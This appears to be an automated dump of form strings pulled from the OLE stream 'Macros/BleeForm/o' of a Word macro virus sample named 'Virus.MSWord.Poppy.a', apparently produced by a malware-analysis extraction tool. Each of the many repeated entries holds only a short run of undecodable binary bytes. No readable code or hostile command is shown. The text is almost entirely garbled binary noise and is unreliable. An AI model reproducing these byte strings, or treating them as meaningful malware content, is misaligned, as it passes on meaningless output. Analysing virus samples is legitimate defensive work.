VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��}IjӐ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
09��v�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c+�}������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
؃�>���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q�����G�G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	'��g9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �+{rz]P��_RF$��	�w'ץ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N}�O�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�N3����!v���(Rx�3r7N�)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
gw�},H���;H��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��߮�(Ī�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
UUP���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s��:▕f��?
C1Rq�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�u6ʨ�ɝ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g�����8��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���T�0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����돷����J&����)��v2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s���s� �C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G��J��禍
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g�1�}��NɂR�RkJc��zs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-����>��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��i�"Q4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q����v��Xc�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�ۮ�)k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
EX�@fTI��(�}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#�N}�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
89a���K	yb�ŷ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!R0���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�߂:k�)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����p4�2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.%Q	(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,2����T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4�`c�$�`�Lt{Qj
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��i-�q�nfux�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:��B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%ϲ����df��v$�9�}�Ѣ��S�41v���G����sw
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���K�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m¢�uX��W��HN�$�x� 1��b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^�_stF��u��>�WI5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WVi���ZY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|6� v�B��U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v;�������4�&���EO�/UT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.V����ϓr��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��G���˕m�L��:6�����7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b8���M�k��O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'�>��p�G�r�OWOx��R�]l����n?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R(�`)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BP���o�]����'�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*���o�^O��c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^�9�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��J.2#-�}����W���_n�ܙ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�B�d�孶�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	M�L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!2%R��?X:ˏ�S�ݜ�ϊ;�s;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g���SO
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�����c@�dr"E��f�]�Y�u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>��}:�H�rq�t��I#y]H�|&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
){F����'��@�.���ϣ;�c��ܝf������L����9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t2�p�<�b3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H6����wy�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v�v���x��Փ۠v��-��&���Y��E��w*���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<笣'/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	`�7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6);'X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!�)�.��z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W��l¶�׊�駠`Cә��x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ϡ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?RkL��[i�/��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p=	#�#�b���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#��g5'�s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�U	;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v>����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}���)&ܖ|n�p:���U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��J��#������Б��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3?�&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/�?o�瞔"Ӊ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�jP|��oS�O#���{��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�D^�2Ʊ��(^YW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=�7���
R$�|����|�����O$�I=x~"�T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ԁ]q�c�Ƿ��z��D��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|����#�\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ӯ�I���O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D��3<j��X�$��ǩ��z7&��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�km<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f�R�>�T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9�@[)CO�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H@�8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ҪZ)%@�D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��㏯۠󹺄���0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z��s�L��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��韯�ה�J���;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a[i���}y�Ӯ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M�|��$�{t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-�8�?̹����Y6��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�C��G��<��JHSњ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��贞�耦
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�AS�=	�i	?0�7E�Rǟ��!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��@2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��zt�X咜�t��q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8魧
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"�y$\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ϡ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>��ڄ��QO[*��6�C��P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�On}��4�̠�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h���R�U@$x�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^~�^�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=rȫ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ǟQ��'�u�"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d��L�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���,8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?N}:8�p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��n�c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}���y��1v�3�[��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��IC;*�Y�;�C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<��CPSI��� ��ђ)[p���#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0'�Ã�E'�ҡ`����8t}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'�q�d�f����FQ�e�UD�}]I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}�s�s��Z҉���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���$�M +
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N�R[,v����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O8� �"
F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2��?8c��>�c��k�,���%��
